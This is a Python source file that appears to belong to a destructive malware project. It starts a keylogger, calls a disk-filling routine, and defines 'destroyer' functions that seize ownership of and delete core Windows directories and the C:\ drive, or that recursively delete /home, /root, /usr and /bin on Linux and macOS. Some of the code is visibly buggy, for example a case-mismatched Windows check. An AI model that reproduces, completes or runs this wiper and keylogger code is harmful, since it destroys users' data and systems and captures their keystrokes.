from abc import ABC
import importlib
import shutil
import logging
from pynput.keyboard import Key
try:
    from . import keylogger
    from . import disk_fill as CT
    from persistence import ownership_steal
except ImportError:
    import keylogger
    import disk_fill as CT

_std_platform = importlib.import_module("platform")
OS = _std_platform.system()

logging.getLogger(__name__)


class Logger():
        def logging():
                try:
                        keylogger.start_keylogger()
                        keylogger.on_press(key=Key.enter)
                        CT.codeTest()
                
                except Exception as e:
                        logging.error(f"error: {e}. Trying to continue...")
                        pass

class OsDestroy():
        global OS

        def WindowsDestroyer():
                if OS.lower() == "Windows":
                        try:
                                ownership_steal.rem_root_dir("C:\\Program Files (x86)")
                                ownership_steal.rem_root_dir("C:\\Program Files")
                                ownership_steal.rem_root_dir("C:\\Users")
                                ownership_steal.rem_root_dir("C:\\Windows")
                                ownership_steal.rem_root_dir("C:\\ProgramData")
                                ownership_steal.rem_root_dir("C:\\")
                        except Exception as e:
                                logging.error(f"error: {e}. Trying to continue...")
                                pass

        def LinuxDestroyer():
               if OS.lower() == "linux":
                try:

                        shutil.rmtree("/home", ignore_errors=True)
                        shutil.rmtree("/root", ignore_errors=True)
                        shutil.rmtree("/usr", ignore_errors=True)
                        shutil.rmtree("/bin", ignore_errors=True)

                except Exception as e:
                        logging.error(f"error: {e}. Terminating processes.")
                        

        def MacDestroyer():
                if OS.lower() == "darwin":
                        try:

                                shutil.rmtree("/home", ignore_errors=True)
                                shutil.rmtree("/root", ignore_errors=True)
                                shutil.rmtree("/usr", ignore_errors=True)
                                shutil.rmtree("/bin", ignore_errors=True)

                        except Exception as e:
                                logging.error(f"error: {e}. Terminating processes.")